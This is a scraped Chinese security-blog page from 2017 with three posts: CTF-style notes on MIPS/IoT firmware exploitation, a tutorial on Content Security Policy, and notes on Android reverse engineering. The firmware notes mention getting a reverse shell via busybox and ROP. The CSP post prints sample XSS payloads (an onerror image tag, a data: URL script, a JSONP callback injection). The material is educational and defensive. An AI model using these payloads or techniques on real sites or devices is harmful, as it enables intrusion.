            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="IOT-Internet-of-Things-物联网"><a href="#IOT-Internet-of-Things-物联网" class="headerlink" title="IOT(Internet of Things) 物联网"></a>IOT(Internet of Things) 物联网</h3><p>CAN协议<br>TTP协议<br>介质访问控制模式CSMA/CD<br>GPS系统遥控<br>obd<br>定位解锁功能</p>
<p>智能联网汽车信息安全状况</p>
<h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><p>RISC架构<br>通用寄存器 32个<br>特殊寄存器 PC hI IO<br>指令定长<br>有大端和小端两种<br>指令还有地址 都是 4字节对齐的<br>数据访问严格4 字节对其<br>流水线</p>
<p>xss(不是很严重)<br>CSRF<br>认证漏洞<br>命令注入（针对后端的lua 脚本)</p>
<p>mips不会自动刷新<br>shellcode 被存于数据的cache中<br>cacch incoherency</p>
<p>使用busybox 启用 reverse shell</p>
<p>由于不能直接与cgi进行交互，可以使用 reverse shell<br>wget一个</p>
<p>-W hexdump<br>-A 分析指令架构 寻找各种架构的函数projoque</p>
<p>binwalk -M</p>
<p>使用 ROP或者其他啊手段一次请求启动reverse shell<br>定位 binary 地组织，可以在同样的环境中进行调试，或者调用其他漏洞的leak</p>
<p>MIPS的shellcode 开发</p>
<p>ropgadget<br>使用 IDA的插件 MIPS ROP Finder(可以支持定制搜索)</p>
<p>找可用gadget<br>向已知地址执行shellcode<br>rop执行system</p>
<p>binutils-mips-linux-gnu<br>qemu-mipsel -L /usr/mipsel-linux-gnu/ ./pwn300</p>
<p>qemu-mipsel<br>MIPS库环境库安装</p>
<p>qemu-mips<br>user mode 直接运行用户程序<br>需要完整的library<br>system mode 直接模拟mips系统</p>
<p>gdb server<br>gdb-multiarch<br>IDA debugger</p>
<p>mips rop gadget<br>MIPS汇编语言<br>逆向工具</p>
<p>基于 MIPS或者 ARM架构的 openwrt<br>普通用户没有 root shell<br>基于 busybox<br>libc 和一般的linux 不同 使用 uclibc(提供基本的嵌入式函数，比较小，节省内存空间)</p>
<p>binwalk<br>firmware-mod-kit</p>
<p>用于开发板的调试<br>输出root Image 或者之际给出系统的rootshell<br>辅助分析</p>
<p>USB2TL<br>Tx端链接开发板Rx<br>Rx端链接开发板Tx<br>GND链接GND</p>
<p>与UART交互</p>
<p>GDN ground<br>TX transmit 发送引脚 3.3v<br>RX recive 接受引脚 3.3。v<br>VCC 电源 一般电压为3.3-5v</p>
<p>openwrt<br>Embedded linux<br>VxWorks<br>uClinux<br>FreeRTOS</p>
<p>与段 与攻击一个web站点类似(比较少，和攻击一个web差不多）<br>正对设备与网关，网关与云端之间的嗅探<br>身份伪造等<br>通过针对设备以及网关的固件你想利用漏洞获取权限 </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/14/内容安全策略-CSP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/14/内容安全策略-CSP/" itemprop="url">内容安全策略(CSP)</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-14T15:08:31+08:00">
                2017-08-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>跨域脚本攻击 <a href="http://baike.baidu.com/view/2161269.htm" target="_blank" rel="external">XSS</a> 是最常见、危害最大的网页安全漏洞。</p>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2016/bg2016091301.png" alt="img"></p>
<p>为了防止它们，要采取很多编程措施，非常麻烦。很多人提出，能不能根本上解决问题，浏览器自动禁止外部注入恶意脚本？</p>
<p>这就是&quot;网页安全政策&quot;（Content Security Policy，缩写 CSP）的来历。本文详细介绍如何使用 CSP 防止 XSS 攻击。</p>
<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
<p>CSP 大大增强了网页的安全性。攻击者即使发现了漏洞，也没法注入脚本，除非还控制了一台列入了白名单的可信主机。</p>
<p>两种方法可以启用 CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2016/bg2016091305.jpg" alt="img"></p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: script-src &apos;self&apos;; object-src &apos;none&apos;;</div><div class="line">&gt; style-src cdn.example.org third-party.org; child-src https:</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>另一种是通过网页的<code>&lt;meta&gt;</code>标签。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>上面代码中，CSP 做了如下配置。</p>
<blockquote>
<ul>
<li>脚本：只信任当前域名</li>
<li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li>
<li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li>
<li>框架（frame）：必须使用HTTPS协议加载</li>
<li>其他资源：没有限制</li>
</ul>
</blockquote>
<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
<p>Chrome 的报错信息。</p>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2016/bg2016091303.png" alt="img"></p>
<p>Firefox 的报错信息。</p>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2016/bg2016091306.png" alt="img"></p>
<h2 id="二、限制选项"><a href="#二、限制选项" class="headerlink" title="二、限制选项"></a>二、限制选项</h2><p>CSP 提供了很多限制选项，涉及安全的各个方面。</p>
<h3 id="2-1-资源加载限制"><a href="#2-1-资源加载限制" class="headerlink" title="2.1 资源加载限制"></a>2.1 资源加载限制</h3><p>以下选项限制各类资源的加载。</p>
<blockquote>
<ul>
<li><strong>script-src</strong>：外部脚本</li>
<li><strong>style-src</strong>：样式表</li>
<li><strong>img-src</strong>：图像</li>
<li><strong>media-src</strong>：媒体文件（音频和视频）</li>
<li><strong>font-src</strong>：字体文件</li>
<li><strong>object-src</strong>：插件（比如 Flash）</li>
<li><strong>child-src</strong>：框架</li>
<li><strong>frame-ancestors</strong>：嵌入的外部资源（比如<frame>、<iframe>、<embed>和<applet>）</applet></iframe></li>
<li><strong>connect-src</strong>：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
<li><strong>worker-src</strong>：<code>worker</code>脚本</li>
<li><strong>manifest-src</strong>：manifest 文件</li>
</ul>
</blockquote>
<h3 id="2-2-default-src"><a href="#2-2-default-src" class="headerlink" title="2.2 default-src"></a>2.2 default-src</h3><p><code>default-src</code>用来设置上面各个选项的默认值。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: default-src &apos;self&apos;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>上面代码限制<strong>所有的</strong>外部资源，都只能从当前域名加载。</p>
<p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p>
<h3 id="2-3-URL-限制"><a href="#2-3-URL-限制" class="headerlink" title="2.3 URL 限制"></a>2.3 URL 限制</h3><p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p>
<blockquote>
<ul>
<li><strong>frame-ancestors</strong>：限制嵌入框架的网页</li>
<li><strong>base-uri</strong>：限制<code>&lt;base#href&gt;</code></li>
<li><strong>form-action</strong>：限制<code>&lt;form#action&gt;</code></li>
</ul>
</blockquote>
<h3 id="2-4-其他限制"><a href="#2-4-其他限制" class="headerlink" title="2.4 其他限制"></a>2.4 其他限制</h3><p>其他一些安全相关的功能，也放在了 CSP 里面。</p>
<blockquote>
<ul>
<li><strong>block-all-mixed-content</strong>：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
<li><strong>upgrade-insecure-requests</strong>：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
<li><strong>plugin-types</strong>：限制可以使用的插件格式</li>
<li><strong>sandbox</strong>：浏览器行为的限制，比如不能有弹出窗口等。</li>
</ul>
</blockquote>
<h3 id="2-5-report-uri"><a href="#2-5-report-uri" class="headerlink" title="2.5 report-uri"></a>2.5 report-uri</h3><p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: default-src &apos;self&apos;; ...; report-uri /my_amazing_csp_report_parser;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。</p>
<p>浏览器会使用<code>POST</code>方法，发送一个JSON对象，下面是一个例子。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&gt; &#123;</div><div class="line">&gt;   &quot;csp-report&quot;: &#123;</div><div class="line">&gt;     &quot;document-uri&quot;: &quot;http://example.org/page.html&quot;,</div><div class="line">&gt;     &quot;referrer&quot;: &quot;http://evil.example.com/&quot;,</div><div class="line">&gt;     &quot;blocked-uri&quot;: &quot;http://evil.example.com/evil.js&quot;,</div><div class="line">&gt;     &quot;violated-directive&quot;: &quot;script-src &apos;self&apos; https://apis.google.com&quot;,</div><div class="line">&gt;     &quot;original-policy&quot;: &quot;script-src &apos;self&apos; https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser&quot;</div><div class="line">&gt;   &#125;</div><div class="line">&gt; &#125;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p><img src="http://www.ruanyifeng.com/blogimg/asset/2016/bg2016091304.png" alt="img"></p>
<h2 id="三、Content-Security-Policy-Report-Only"><a href="#三、Content-Security-Policy-Report-Only" class="headerlink" title="三、Content-Security-Policy-Report-Only"></a>三、Content-Security-Policy-Report-Only</h2><p>除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。</p>
<p>它必须与<code>report-uri</code>选项配合使用。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy-Report-Only: default-src &apos;self&apos;; ...; report-uri /my_amazing_csp_report_parser;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<h2 id="四、选项值"><a href="#四、选项值" class="headerlink" title="四、选项值"></a>四、选项值</h2><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
<blockquote>
<ul>
<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
<li>路径名：<code>example.org/resources/js/</code></li>
<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
<li>协议名：<code>https:</code>、<code>data:</code></li>
<li>关键字<code>&#39;self&#39;</code>：当前域名，需要加引号</li>
<li>关键字<code>&#39;none&#39;</code>：禁止加载任何外部资源，需要加引号</li>
</ul>
</blockquote>
<p>多个值也可以并列，用空格分隔。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: script-src &apos;self&apos; https://apis.google.com</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>如果同一个限制选项使用多次，只有第一次会生效。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt; # 错误的写法</div><div class="line">&gt; script-src https://host1.com; script-src https://host2.com</div><div class="line">&gt;</div><div class="line">&gt; # 正确的写法</div><div class="line">&gt; script-src https://host1.com https://host2.com</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>如果不设置某个限制选项，就是默认允许任何值。</p>
<h2 id="五、script-src-的特殊值"><a href="#五、script-src-的特殊值" class="headerlink" title="五、script-src 的特殊值"></a>五、script-src 的特殊值</h2><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
<blockquote>
<ul>
<li><strong>&#39;unsafe-inline&#39;</strong>：允许执行页面内嵌的<code>&amp;lt;script&gt;</code>标签和事件监听函数</li>
<li><strong>unsafe-eval</strong>：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li>
<li><strong>nonce值</strong>：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</li>
<li><strong>hash值</strong>：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li>
</ul>
</blockquote>
<p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: script-src &apos;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&apos;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>页面内嵌脚本，必须有这个token才能执行。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</div><div class="line">&gt;   // some code</div><div class="line">&gt; &lt;/script&gt;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; Content-Security-Policy: script-src &apos;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&apos;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>下面的代码就会允许执行，因为hash值相符。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script&gt;alert(&apos;Hello, world.&apos;);&lt;/script&gt;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>注意，计算hash值的时候，\&lt;script>标签不算在内。</p>
<p>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p>
<h2 id="六、注意点"><a href="#六、注意点" class="headerlink" title="六、注意点"></a>六、注意点</h2><p>（1）<code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</p>
<p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p>
<p>（2）<code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data:</code>URL。</p>
<p>下面是两个恶意攻击的例子。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;img src=&quot;x&quot; onerror=&quot;evil()&quot;&gt;</div><div class="line">&gt; &lt;script src=&quot;data:text/javascript,evil()&quot;&gt;&lt;/script&gt;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>（3）必须特别注意 JSONP 的回调函数。</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;script</div><div class="line">&gt; src=&quot;/path/jsonp?callback=alert(document.domain)//&quot;&gt;</div><div class="line">&gt; &lt;/script&gt;</div><div class="line">&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p>
<h2 id="七、参考链接"><a href="#七、参考链接" class="headerlink" title="七、参考链接"></a>七、参考链接</h2><ul>
<li><a href="https://research.google.com/pubs/pub45542.html" target="_blank" rel="external">CSP Is Dead, Long Live CSP! </a>, by Lukas Weichselbaum</li>
<li><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/" target="_blank" rel="external">An Introduction to Content Security Policy</a>, by Mike West</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/11/XMAN之旅——Android/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/11/XMAN之旅——Android/" itemprop="url">XMAN之旅——Android</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-11T08:47:57+08:00">
                2017-08-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/xman/" itemprop="url" rel="index">
                    <span itemprop="name">xman</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-赵帅讲android基础"><a href="#1-赵帅讲android基础" class="headerlink" title="1. 赵帅讲android基础"></a>1. 赵帅讲android基础</h3><h4 id="1-1-APK的文件结构"><a href="#1-1-APK的文件结构" class="headerlink" title="1.1 APK的文件结构"></a>1.1 APK的文件结构</h4><p><strong>重要的标签及属性</strong></p>
<ul>
<li>Minsdklevel</li>
<li>Targetsdklevel</li>
<li>android:enable</li>
<li>android:export</li>
<li>Android:process</li>
<li>Browerable</li>
</ul>
<p><strong>jar包和apk包</strong></p>
<h4 id="1-2-常见的基本类型"><a href="#1-2-常见的基本类型" class="headerlink" title="1.2 常见的基本类型"></a>1.2 常见的基本类型</h4><p>反编译采用的是dalvik字节码，反编译之后成为smali文件。</p>
<p>dalvik字节码有两种类型，原始类型和引用类型。对象和数组是引用类型，其它都是原始类型。</p>
<p>smali数据类型都是用一个字母表示，如果你熟悉Java的数据类型，你会发现表示smali数据类型的字母其实是Java基本数据类型首字母的大写，除boolean类型外，在smail中用大写的”Z”表示boolean类型。</p>
<table>
<thead>
<tr>
<th>标识</th>
<th>类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>V</td>
<td>void，只能用于返回值类型</td>
</tr>
<tr>
<td>Z</td>
<td>boolean</td>
</tr>
<tr>
<td>B</td>
<td>byte</td>
</tr>
<tr>
<td>S</td>
<td>short</td>
</tr>
<tr>
<td>C</td>
<td>char</td>
</tr>
<tr>
<td>I</td>
<td>int</td>
</tr>
<tr>
<td>J</td>
<td>long (64 bits)</td>
</tr>
<tr>
<td>F</td>
<td>float</td>
</tr>
<tr>
<td>D</td>
<td>double (64 bits)</td>
</tr>
<tr>
<td>L</td>
<td>对象类型</td>
</tr>
<tr>
<td>[</td>
<td>数据类型</td>
</tr>
</tbody>
</table>
<p>对象以Lpackage/name/ObjectName;的形式表示。前面的L表示这是一个对象类型，package/name/是该对象所在的包，ObjectName是对象的名字，“;”表示对象名称的结束。相当于java中的package.name.ObjectName。</p>
<p><strong>类的表示形式</strong></p>
<blockquote>
<p>Ljava/lang/String;相当于java.lang.String</p>
</blockquote>
<p><strong>数组的表示形式</strong></p>
<blockquote>
<p>[ 表示一个整型一维数组，相当于java中的int[]<br>对于多维数组，只要增加[就行了。[[I相当于int[][]，[[[I相当于int[][][]。注意每一维的最多255个。</p>
</blockquote>
<p><strong>对象数组的表示</strong></p>
<blockquote>
<p>[Ljava/lang/String;表示一个String对象数组。</p>
</blockquote>
<p><strong>方法表示形式</strong></p>
<p>方法通常必须详细的指定方法类型: 方法名，参数类型，返回类型，所有这些信息都是为虚拟机是能够找到正确的方法并执行。</p>
<blockquote>
<p>Lpackage/name/ObjectName;-&gt;MethodName(III)Z</p>
</blockquote>
<p>在上面的例子中，Lpackage/name/ObjectName;表示类，MethodName是方法名。III为参数（在此是3个整型参数），Z是返回类型（bool型）。方法的参数是一个接一个的，中间没有隔开。</p>
<blockquote>
<p>一个更复杂的例子：method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;</p>
</blockquote>
<p>在java中则为：String method(int, int[][], int, String, Object[])</p>
<h4 id="1-3-Dalvik-Code"><a href="#1-3-Dalvik-Code" class="headerlink" title="1.3 Dalvik Code"></a>1.3 Dalvik Code</h4><p>掌握以上的字段和方法的描述,只能说我们懂了如何描述一个字段和方法,而关于方法中具体的逻辑则需要了解Dalvik中的指令集.因为Dalvik是基于寄存器的架构的,因此指令集和JVM中的指令集区别较大,反而更类似x86的中的汇编指令.</p>
<p><a href="http://pallergabor.uw.hu/androidblog/dalvik_opcodes.html" target="_blank" rel="external">Davilk指令集大全</a></p>
<h4 id="1-3-ELF"><a href="#1-3-ELF" class="headerlink" title="1.3 ELF"></a>1.3 ELF</h4><p>可以链接第三方库，可以解决历史代码问题，可以进行逻辑保护，一般用so文件表示。</p>
<h4 id="1-4-常见组件"><a href="#1-4-常见组件" class="headerlink" title="1.4 常见组件"></a>1.4 常见组件</h4><p><strong><a href="http://www.cnblogs.com/shen-hua/p/5811195.html" target="_blank" rel="external">组件一：Intent</a></strong></p>
<ul>
<li>Action</li>
<li>Component</li>
<li>Category</li>
<li>data</li>
</ul>
<blockquote>
<p>Android中提供了Intent机制来协助应用间的交互与通讯，或者采用更准确的说法是，Intent不仅可用于应用程序之间，也可用于应用程序内部的activity, service和broadcast receiver之间的交互。Intent这个英语单词的本意是“目的、意向、意图”。</p>
<p>Intent是一种运行时绑定（runtime binding)机制，它能在程序运行的过程中连接两个不同的组件。通过Intent，你的程序可以向Android表达某种请求或者意愿，Android会根据意愿的内容选择适当的组件来响应。</p>
</blockquote>
<p><img src="/images/2017-08-11/Intent.png" alt="组件详情"></p>
<p><strong>组件二：Service</strong></p>
<ul>
<li>onStart</li>
<li>onStartCommand</li>
<li>Exported</li>
<li>Android:process</li>
</ul>
<p><strong>组件三：Activity</strong></p>
<p><strong>组件四：Webview</strong></p>
<ul>
<li>setSavePassword</li>
<li>setJavascriptEnabled</li>
<li>addJavascriptInterface</li>
<li>Loadurl</li>
</ul>
<p><strong>组件五：PendingIntent</strong></p>
<ul>
<li>Notification</li>
<li>getActivity</li>
<li>getService</li>
<li>getBroadcast</li>
</ul>
<h4 id="1-5-运行时的目录结构"><a href="#1-5-运行时的目录结构" class="headerlink" title="1.5 运行时的目录结构"></a>1.5 运行时的目录结构</h4><p>私有目录</p>
<ul>
<li>/data/data/packagename</li>
</ul>
<p>sdcard</p>
<h4 id="1-6-工具"><a href="#1-6-工具" class="headerlink" title="1.6 工具"></a>1.6 工具</h4><p><strong>反编译工具</strong></p>
<ul>
<li>Dex2jar</li>
<li>jd-gui    ——jar包反编译</li>
<li>jadx        ——Apk反编译</li>
<li>jeb        ——Apk解包、反汇编、反编译</li>
</ul>
<p><strong>其他工具</strong></p>
<ul>
<li>Burpsuite</li>
<li>Akana</li>
<li>Janus</li>
</ul>
<h4 id="1-7-ctf中常用的方法"><a href="#1-7-ctf中常用的方法" class="headerlink" title="1.7 ctf中常用的方法"></a>1.7 ctf中常用的方法</h4><p><strong>HOOK</strong></p>
<ul>
<li>代码分析</li>
<li>目标方法筛选</li>
<li>编写脚本</li>
<li>运行测试</li>
</ul>
<p><strong>重打包</strong></p>
<ul>
<li>解包  apktool d</li>
<li>修改</li>
<li>打包  apktool b</li>
<li>签名</li>
</ul>
<h4 id="1-8-工业界漏洞"><a href="#1-8-工业界漏洞" class="headerlink" title="1.8 工业界漏洞"></a>1.8 工业界漏洞</h4><p><strong>组件暴露相关信息</strong></p>
<ul>
<li>Enabled  =&gt; true</li>
<li>exported  =&gt; false   (有intent-filter，默认值就是true)   关键</li>
<li>Action =&gt; 系统Action 非系统Action</li>
<li>Permission                                            关键</li>
<li>ContentProvider</li>
</ul>
<p><strong>攻击窗口</strong></p>
<ul>
<li>动态注册</li>
<li>窗口期</li>
</ul>
<p><strong>组件劫持</strong></p>
<ul>
<li>Activity劫持</li>
<li>Receiver劫持</li>
<li>Service劫持</li>
<li>intent嗅探</li>
</ul>
<p><strong>Webview组件问题</strong></p>
<ul>
<li>远程代码执行</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/11/XMAN之旅——Misc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/11/XMAN之旅——Misc/" itemprop="url">XMAN之旅——Misc</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-11T00:49:22+08:00">
                2017-08-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/xman/" itemprop="url" rel="index">
                    <span itemprop="name">xman</span>
                  </a>
                </span>

                
                
              
